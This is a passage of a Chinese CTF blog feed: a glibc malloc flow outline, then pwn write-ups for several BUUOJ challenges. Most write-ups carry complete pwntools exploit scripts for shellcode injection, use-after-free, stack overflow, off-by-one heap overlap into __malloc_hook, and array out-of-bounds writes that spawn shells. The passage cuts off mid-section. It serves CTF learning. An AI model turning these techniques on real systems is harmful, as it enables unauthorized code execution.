title="malloc过程"></a>malloc过程</h1><ul><li><p>计算真正堆块大小（加上头部长度、对齐）</p></li><li><p>是否在fastbin范围内？</p><ul><li>是，检查对应的bin链表中有没有chunk<ul><li>有，分配给用户，结束</li></ul></li></ul></li><li><p>如果不在fastbin范围内，或者没有chunk可用</p></li><li><p>是否在smallbin范围内？</p><ul><li>是，检查对应大小的bin链表中有没有chunk<ul><li>有，分配给用户，结束</li></ul></li></ul></li><li><p>如果不在smallbin范围内，或者smallbin里面也没有</p></li><li><p>unsortedbin中有没有chunk？</p><ul><li>有，从尾部取出第一个chunk，看看大小是否满足需求<ul><li>满足，切分后大小是否大于minsize？（64位下minisize为0x20）<ul><li>大于，切分块，返回给用户，剩下的块放进unsortedbin</li><li>小于或等于minsize，直接全部分配给用户，结束</li></ul></li><li>不满足，把这个块放入small/largebin对应的链表中，继续遍历下一个块</li></ul></li></ul></li><li><p>如果unsortedbin中所有的块也不能满足需求</p></li><li><p>大小是否在largebin范围？</p><ul><li>是，检查对应的bin链表中有没有符合的chunk<ul><li>有，找到满足需求最小的chunk，切分块返回，剩下的放进unsortedbin中</li></ul></li></ul></li><li><p>largebin也不行？再次遍历small/large寻找最合适的chunk</p></li><li><p>还是没有，那就从topchunk中切割</p></li><li><p>topchunk也不够？mmap系统调用</p></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;img src=&quot;/2021/07/16/2021-07-23-bin%E9%93%BE%E6%83%85%E5%86%B5%E5%90%88%E9%9B%86/image-20210720154252123-1627363406388.png&quot; alt=&quot;image-2</summary>
      
    
    
    
    
    <category term="heap" scheme="http://example.com/tags/heap/"/>
    
  </entry>
  
  <entry>
    <title>buu06</title>
    <link href="http://example.com/2021/06/05/2021-06-14-buu06/"/>
    <id>http://example.com/2021/06/05/2021-06-14-buu06/</id>
    <published>2021-06-05T03:33:26.000Z</published>
    <updated>2021-10-13T08:01:21.077Z</updated>
    
    <content type="html"><![CDATA[<h3 id="bjdctf-2020-router"><a href="#bjdctf-2020-router" class="headerlink" title="bjdctf_2020_router"></a>bjdctf_2020_router</h3><p>常规checksec一下，看看保护</p><p><img src="/2021/06/05/2021-06-14-buu06/QQ%E5%9B%BE%E7%89%8720210605121040.png"></p><p>只开启了NX</p><p>进入ida看看代码<img src="/2021/06/05/2021-06-14-buu06/QQ%E5%9B%BE%E7%89%8720210605121308.png"></p><p>第一个功能很神奇的让我们输入一个长度为0x10的数据，然后用system调用？我跑去nc了一下</p><p><img src="/2021/06/05/2021-06-14-buu06/QQ%E5%9B%BE%E7%89%8720210605121007.png"></p><p>好吧，成功获得flag了。</p><h3 id="picoctf-2018-shellcode"><a href="#picoctf-2018-shellcode" class="headerlink" title="picoctf_2018_shellcode"></a>picoctf_2018_shellcode</h3><p>checksec一下<img src="/2021/06/05/2021-06-14-buu06/QQ%E5%9B%BE%E7%89%8720210614103954.png"></p><p>保护都没开启，拖入ida分析一下。无法F5反汇编，只能看汇编代码了。</p><p><img src="/2021/06/05/2021-06-14-buu06/QQ%E5%9B%BE%E7%89%8720210614104047.png"></p><p><img src="/2021/06/05/2021-06-14-buu06/QQ%E5%9B%BE%E7%89%8720210614104037.png"></p><p>有个vuln函数，里面有调用gets和puts两个函数，可以进行输入。再看其他代码，底下有个call eax，可以进行执行代码，看下eax的内容来自哪里</p><p><img src="/2021/06/05/2021-06-14-buu06/QQ%E5%9B%BE%E7%89%8720210614104610.png"></p><p>这里传递给eax的地址与下面调用时一致，然后vuln函数里面gets输入的地址是ebp+8中存放的地址，其实就是eax里面的地址内容，所以整个程序总的说就是会执行我们输入进去的东西，加上nx未开，输入shellcode来getshell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p=remote(<span class="hljs-string">&quot;node3.buuoj.cn&quot;</span>,<span class="hljs-number">28165</span>)<br>context(log_level=<span class="hljs-string">&#x27;debug&#x27;</span>,arch=<span class="hljs-string">&#x27;i386&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br>shellcode=asm(shellcraft.sh())<br>p.sendlineafter(<span class="hljs-string">&quot;string!&quot;</span>,shellcode)<br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="hitcontraining-uaf"><a href="#hitcontraining-uaf" class="headerlink" title="hitcontraining_uaf"></a>hitcontraining_uaf</h3><p>常规checksec一下</p><p><img src="/2021/06/05/2021-06-14-buu06/image-20210727132448387.png" alt="image-20210727132448387"></p><p>进入ida看看，其实题目已经有暗示，uaf，所以我们先去delete函数里面看看，</p><p><img src="/2021/06/05/2021-06-14-buu06/image-20210727132528641.png" alt="image-20210727132528641"></p><p>确实存在着uaf，那么该怎么利用？再看看add函数和printf函数</p><p><img src="/2021/06/05/2021-06-14-buu06/image-20210727132617843.png" alt="image-20210727132617843"></p><p>这边的add函数比较奇怪，首先是有次数限制只能申请五个堆块，其次是会申请两个堆块，第一个堆块是固定8字节大小，前4个字节存放一个print_note_content函数的地址，后4个字节是我们可以控制的，申请一个任意大小的堆块</p><p><img src="/2021/06/05/2021-06-14-buu06/image-20210727132832076.png" alt="image-20210727132832076"></p><p>在print函数里面，最后会进行函数调用，就是调用先前在add函数里面保存的print_note_content函数进行打印我们可以控制的堆块里面的内容</p><p><img src="/2021/06/05/2021-06-14-buu06/image-20210727133015119.png" alt="image-20210727133015119"></p><p>最后就是还存在一个后门函数</p><p>思路：一开始是觉得没有edit这类的函数，可能是要制造堆块重叠，把后门函数劫持到malloc_hook里面去，还以为5个会够，但是一个泄露libc基址，再一个申请fastchunk进行double free，然后还需要申请四次，超过次数了</p><p><img src="/2021/06/05/2021-06-14-buu06/image-20210727135534549.png" alt="image-20210727135534549"></p><p>这是double free的fastbin上的情况，因为free也是两个，所以直接进行两次操作直接就可以构造出A-B-A</p><p>所以换一种方法：利用那个函数调用，想办法把进行调用的堆块变成是我们可以控制的那个堆块，把内容改成后门函数，那么就可以getshell了！</p><p><img src="/2021/06/05/2021-06-14-buu06/image-20210727140624461.png" alt="image-20210727140624461"></p><p>像这样，我们可以控制的堆块申请一个比0x8大的堆块，那么我们就不会申请走，而固定申请大小为0x8的堆块就会申请走一个，此时我们，如果再申请0x8的堆块，就会进行更换了，我们申请到的就是之前程序的固定堆块，最后printf一下，就getshell了！</p><p><img src="/2021/06/05/2021-06-14-buu06/image-20210727141018340.png" alt="image-20210727141018340"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch = <span class="hljs-string">&#x27;i386&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./hacknote&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu11.2_i386/libc-2.23.so&quot;</span>)<br>ld = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu11.2_i386/ld-2.23.so&quot;</span>)<br><span class="hljs-comment">#p = process(argv=[ld.path,elf.path],env=&#123;&quot;LD_PRELOAD&quot; : libc.path&#125;)</span><br>p=remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">26333</span>)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>gdb.attach(p,<span class="hljs-string">&quot;b main&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">size,content</span>):</span><br>  p.sendlineafter(<span class="hljs-string">&#x27;choice :&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>  p.sendlineafter(<span class="hljs-string">&#x27;Note size :&#x27;</span>,<span class="hljs-built_in">str</span>(size))<br>  p.sendlineafter(<span class="hljs-string">&#x27;Content :&#x27;</span>,content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">delete</span>(<span class="hljs-params">idx</span>):</span><br>  p.sendlineafter(<span class="hljs-string">&#x27;choice :&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>  p.sendlineafter(<span class="hljs-string">&#x27;Index :&#x27;</span>,<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">printf</span>(<span class="hljs-params">idx</span>):</span><br>  p.sendlineafter(<span class="hljs-string">&#x27;choice :&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>  p.sendlineafter(<span class="hljs-string">&#x27;Index :&#x27;</span>,<span class="hljs-built_in">str</span>(idx))<br><br>shell_addr=<span class="hljs-number">0x8048945</span><br>add(<span class="hljs-number">0x8</span>,<span class="hljs-string">&#x27;a&#x27;</span>)<br>delete(<span class="hljs-number">0</span>)<br>delete(<span class="hljs-number">0</span>)<br>add(<span class="hljs-number">0x10</span>,<span class="hljs-string">&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">0x8</span>,p32(shell_addr))<br>printf(<span class="hljs-number">0</span>)<br><span class="hljs-comment">#debug()</span><br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="picoctf-2018-buffer"><a href="#picoctf-2018-buffer" class="headerlink" title="picoctf_2018_buffer"></a>picoctf_2018_buffer</h3><p><img src="/2021/06/05/2021-06-14-buu06/image-20210728144721443.png" alt="image-20210728144721443"></p><p>checksec的情况来看以及名字，应该是道栈题目，进入ida看看</p><p><img src="/2021/06/05/2021-06-14-buu06/image-20210728144750715.png" alt="image-20210728144750715"></p><p>漏洞点应该是在这了，存在明显栈溢出</p><p><img src="/2021/06/05/2021-06-14-buu06/image-20210728145612076.png" alt="image-20210728145612076"></p><p>程序本身还蕴含着一个函数，这个函数会读取flag里面的内容，只要通过判断即可打印出flag</p><p><img src="/2021/06/05/2021-06-14-buu06/image-20210728145716640.png" alt="image-20210728145716640"></p><p>而这里的a1，a2就是该函数的参数。</p><p><img src="/2021/06/05/2021-06-14-buu06/image-20210728150414970.png" alt="image-20210728150414970"></p><p>成功获取flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p=remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">28765</span>)<br>win_addr=<span class="hljs-number">0x080485CB</span><br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x70</span>+p32(win_addr)+p32(<span class="hljs-number">0</span>)+p32(<span class="hljs-number">0xDEADBEEF</span>)+p32(<span class="hljs-number">0xDEADC0DE</span>)<br>p.recvuntil(<span class="hljs-string">&quot;Please enter your string:&quot;</span>)<br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="roarctf-2019-easy-pwn"><a href="#roarctf-2019-easy-pwn" class="headerlink" title="roarctf_2019_easy_pwn"></a>roarctf_2019_easy_pwn</h3><p>常规checksec一下，保护全开，可能是道堆题了，进入ida看看程序</p><p><img src="/2021/06/05/2021-06-14-buu06/image-20210728151846042.png" alt="image-20210728151846042"></p><p>漏洞点在于write函数里面</p><p><img src="/2021/06/05/2021-06-14-buu06/image-20210730125048904.png" alt="image-20210730125048904"></p><p>这里会把我们之前申请堆块时输入的size与现在要写入的size进行比较，如果我们现在写入的size比原来的size大10，就可以多写一个，所以漏洞点是offbyone</p><p>泄露libc，因为calloc会清空堆块的数据，所以这边借着溢出，把is_mmap位改为1，就不会被清空数据，借此把libc泄露出来</p><p><img src="/2021/06/05/2021-06-14-buu06/image-20210730215233503.png" alt="image-20210730215233503"></p><p>然后就利用offbyone修改堆块的size，制造overlop，修改被覆盖的堆块的fd指针，然后把堆块申请到malloc_hook上去</p><p><img src="/2021/06/05/2021-06-14-buu06/image-20210730233057769.png" alt="image-20210730233057769"></p><p><img src="/2021/06/05/2021-06-14-buu06/image-20210730233446054.png" alt="image-20210730233446054"></p><p>这边我已经成功写进去了，但是没有getshell，四种都没办法getshell，那接下来，就有很多处理方式了</p><ul><li>转而去修改free_hook函数</li><li>利用realloc调整栈帧</li><li>house of orange（通杀2.23以及2.24）</li></ul><p>这边我使用realloc调整栈帧，其他方法后续会更新的（我也不知道后续是多久~）</p><p><img src="/2021/06/05/2021-06-14-buu06/image-20210731002134507.png" alt="image-20210731002134507"></p><p>这边可以看见，并不会为NULL，所以one_gadget条件没有达成，然后看看realloc,会压栈</p><p><img src="/2021/06/05/2021-06-14-buu06/image-20210731002037708.png" alt="image-20210731002037708"></p><p><img src="/2021/06/05/2021-06-14-buu06/image-20210731002752890.png" alt="image-20210731002752890"></p><p>发现，其实压栈导致的rsp-0x8，已经让one_gadget的条件达成了，所以就不用再去找了</p><p><img src="/2021/06/05/2021-06-14-buu06/image-20210731001850853.png" alt="image-20210731001850853"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./roarctf_2019_easy_pwn&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu11.2_amd64/libc-2.23.so&quot;</span>)<br>ld = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu11.2_amd64/ld-2.23.so&quot;</span>)<br>p = process(argv=[ld.path,elf.path],env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libc.path&#125;)<br>libc = ELF(<span class="hljs-string">&quot;./libc-2.23.so&quot;</span>)<br>p=remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">25420</span>)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>gdb.attach(p,<span class="hljs-string">&quot;b main&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">size</span>):</span><br>p.sendlineafter(<span class="hljs-string">&quot;choice: &quot;</span>,<span class="hljs-string">&quot;1&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;size: &quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(size))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">idx,size,content</span>):</span><br>p.sendlineafter(<span class="hljs-string">&quot;choice: &quot;</span>,<span class="hljs-string">&quot;2&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;index: &quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(idx))<br>p.recvuntil(<span class="hljs-string">&quot;size: &quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(size+<span class="hljs-number">10</span>))<br>p.recvuntil(<span class="hljs-string">&quot;content: &quot;</span>)<br>p.send(content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>(<span class="hljs-params">idx</span>):</span><br>p.sendlineafter(<span class="hljs-string">&quot;choice: &quot;</span>,<span class="hljs-string">&quot;4&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;index: &quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(idx))<br>p.recvuntil(<span class="hljs-string">&quot;content: &quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params">idx</span>):</span><br>p.sendlineafter(<span class="hljs-string">&quot;choice: &quot;</span>,<span class="hljs-string">&quot;3&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;index: &quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(idx))<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">0x45216 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  rax == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0x4526a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x30] == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xf02a4 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x50] == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xf1147 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x70] == NULL</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>add(<span class="hljs-number">0x68</span>)<span class="hljs-comment">#0</span><br>add(<span class="hljs-number">0x88</span>)<span class="hljs-comment">#1</span><br>add(<span class="hljs-number">0x68</span>)<span class="hljs-comment">#2</span><br>add(<span class="hljs-number">0x68</span>)<span class="hljs-comment">#3</span><br>add(<span class="hljs-number">0x68</span>)<span class="hljs-comment">#4</span><br>free(<span class="hljs-number">1</span>)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-number">0x68</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x68</span>+<span class="hljs-string">&#x27;\x93&#x27;</span>)<br>add(<span class="hljs-number">0x88</span>)<span class="hljs-comment">#1</span><br>show(<span class="hljs-number">1</span>)<br>libc_base=u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>))-<span class="hljs-number">0x3c4b78</span><br>mlh=libc_base+libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>rlh=libc_base+libc.sym[<span class="hljs-string">&#x27;&#x27;</span>]<br>realloc=libc_base+libc.sym[<span class="hljs-string">&#x27;__libc_realloc&#x27;</span>]<br>ogg=libc_base+<span class="hljs-number">0x4526a</span><br>log.success(<span class="hljs-string">&quot;libc base==&gt;0x%x&quot;</span> %libc_base)<br>log.success(<span class="hljs-string">&quot;__malloc_hook==&gt;0x%x&quot;</span> %mlh)<br>log.success(<span class="hljs-string">&quot;realloc==&gt;0x%x&quot;</span> %realloc)<br>log.success(<span class="hljs-string">&quot;one_gadget==&gt;0x%x&quot;</span> %ogg)<br><br>edit(<span class="hljs-number">1</span>,<span class="hljs-number">0x88</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x88</span>+<span class="hljs-string">&#x27;\xe1&#x27;</span>)<br>free(<span class="hljs-number">3</span>)<br>free(<span class="hljs-number">2</span>)<br>add(<span class="hljs-number">0xd8</span>)<span class="hljs-comment">#2</span><br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x60</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x71</span>)+p64(mlh-<span class="hljs-number">0x30</span>+<span class="hljs-number">0xd</span>)<br>edit(<span class="hljs-number">2</span>,<span class="hljs-built_in">len</span>(payload)-<span class="hljs-number">10</span>,payload)<br>add(<span class="hljs-number">0x68</span>)<span class="hljs-comment">#3</span><br>add(<span class="hljs-number">0x68</span>)<span class="hljs-comment">#5</span><br>payload=p8(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>+p64(<span class="hljs-number">0</span>)+p64(ogg)+p64(realloc)<br>edit(<span class="hljs-number">5</span>,<span class="hljs-built_in">len</span>(payload)-<span class="hljs-number">10</span>,payload)<br><br><span class="hljs-comment">#debug()</span><br>add(<span class="hljs-number">0x10</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="wustctf2020-getshell-2"><a href="#wustctf2020-getshell-2" class="headerlink" title="wustctf2020_getshell_2"></a>wustctf2020_getshell_2</h3><p><img src="/2021/06/05/2021-06-14-buu06/image-20210808202602382.png" alt="image-20210808202602382"></p><p>先checksec一下，32位，开启保护只有nx</p><p><img src="/2021/06/05/2021-06-14-buu06/image-20210808203034653.png" alt="image-20210808203034653"></p><p><img src="/2021/06/05/2021-06-14-buu06/image-20210808205220758.png" alt="image-20210808205220758"></p><p>ida里面十分简单，漏洞点就这么一些东西，说明就是一个栈溢出，而溢出算上返回地址，只有八个字节，给的后门函数是无法使用的，那么如果按照原来的构造方法，字节数是不够的，因为加上返回地址，那明显是要十二个字节。然后这边的字符要去找sh，只有sh也是可以getshell的，除此之外，那如果要不需要返回地址，那就要去跳转到这边的程序里面已经有的call _system，就可以不需要返回地址，因为call指令会自动的将下一条指令压入栈中作为返回地址</p><p><img src="/2021/06/05/2021-06-14-buu06/image-20210808205011413.png" alt="image-20210808205011413"></p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">27986</span>)<br>sys = <span class="hljs-number">0x8048529</span><br>sh = <span class="hljs-number">0x08048670</span><br>payload = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x1c</span> + p32(sys) + p32(sh)<br>p.send(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="qctf-2018-stack2"><a href="#qctf-2018-stack2" class="headerlink" title="qctf_2018_stack2"></a>qctf_2018_stack2</h3><p><img src="/2021/06/05/2021-06-14-buu06/image-20210808210516960.png" alt="image-20210808210516960"></p><p>checksec一下，32位，且有nx以及canary，那就要先去寻找怎么泄露canary了，不然是没法做的</p><p><img src="/2021/06/05/2021-06-14-buu06/image-20210808214029860.png" alt="image-20210808214029860"></p><p>分析了一下程序的功能，不存在溢出点，输入函数也都是用的scanf，只有这个地方应该是有问题的，首先这个数组的是在栈上的，而数组下标我们是可以控制的，那就存在了数组越界问题了。并且给了一个后门函数，那就可以逐个字节的输入进去，覆盖返回地址，这样也就不需要去泄露canary了</p><p>然后就是数组的偏移，直接看ida的反汇编是错误的，为什么会错？</p><p><img src="/2021/06/05/2021-06-14-buu06/image-20210808222850151.png" alt="image-20210808222850151"></p><p><img src="/2021/06/05/2021-06-14-buu06/image-20210808222112204.png" alt="image-20210808222112204"></p><p>汇编代码可以解惑：由于这边的处理不同，导致ebp的下方并不是返回地址，而是还有一段距离，就要去调试获得了</p><p><img src="/2021/06/05/2021-06-14-buu06/image-20210808225803029.png" alt="image-20210808225803029"></p><p>我选择在下标为1的位置输入调试，而这边[ebp+eax*1-0x70]就是输入的数最终会存放的地方，因为我输的是0，所以可以算出的ebp-0x70就是数组的起始地址，这样只要再去算一下返回地址到这的偏移即可</p><p><img src="/2021/06/05/2021-06-14-buu06/image-20210808230055266.png" alt="image-20210808230055266"></p><p>算出偏移之后就是利用数组越界把后门函数地址写入到返回地址</p><p><img src="/2021/06/05/2021-06-14-buu06/image-20210808221957029.png" alt="image-20210808221957029"></p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">25028</span>)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>p.recvuntil(<span class="hljs-string">&quot;have:&quot;</span>)<br>p.sendline(<span class="hljs-string">&#x27;0&#x27;</span>)<br>get_shell = [<span class="hljs-number">0x9b</span>,<span class="hljs-number">0x85</span>,<span class="hljs-number">0x04</span>,<span class="hljs-number">0x08</span>]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>p.sendlineafter(<span class="hljs-string">&quot;5. exit&quot;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&quot;change&quot;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">0x84</span>+i))<br>p.sendlineafter(<span class="hljs-string">&quot;number:&quot;</span>,<span class="hljs-built_in">str</span>(get_shell[i]))<br>p.sendlineafter(<span class="hljs-string">&quot;5. exit&quot;</span>,<span class="hljs-string">&#x27;5&#x27;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="ZJCTF-2019-Login"><a href="#ZJCTF-2019-Login" class="headerlink" title="[ZJCTF 2019]Login"></a>[ZJCTF 2019]Login</h3><p><img src="/2021/06/05/2021-06-14-buu06/image-20210812160620361.png" alt="image-20210812160620361"></p><p>先checksec一下，64位，开启了nx和canary，可能要泄露canary，进入ida分析一下</p><p>进入程序，是个用c++编写的程序，看起来有些费力</p><p><img src="/2021/06/05/2021-06-14-buu06/image-20210812162011685.png" alt="image-20210812162011685"></p><p>首先找到了一个后门函数，那么就再去找找输入点，看看有没有溢出，以及找找有没有函数调用的地方。然后可以发现，输入点是不存在溢出到返回地址的，但是可以找到一个能进行函数调用的地方</p><p><img src="/2021/06/05/2021-06-14-buu06/image-20210812162329071.png" alt="image-20210812162329071"></p><p>在整个程序的最后，进行密码验证，如果通过就会进行函数调用。那么，就去找找这个函数调用从哪里传入，是否可以修改？以及怎么通过检验</p><p><img src="/2021/06/05/2021-06-14-buu06/image-20210812165314541.png" alt="image-20210812165314541"></p><p>首先通过验证，把这的账号密码输入进去即可</p><p><img src="/2021/06/05/2021-06-14-buu06/image-20210812165836228.png" alt="image-20210812165836228"></p><p><img src="/2021/06/05/2021-06-14-buu06/image-20210812165850893.png" alt="image-20210812165850893"></p><p>然后就是要进行覆盖，把v8覆盖为后门函数，v8又来自vuln，而vuln似乎不是我们可以控制的变量。但是去查汇编代码，可以知道最后的函数调用，表现是call rax，那是否可以去修改rax的数据呢？</p><p><img src="/2021/06/05/2021-06-14-buu06/image-20210812170456157.png" alt="image-20210812170456157"></p><p>这里很有意思，在call 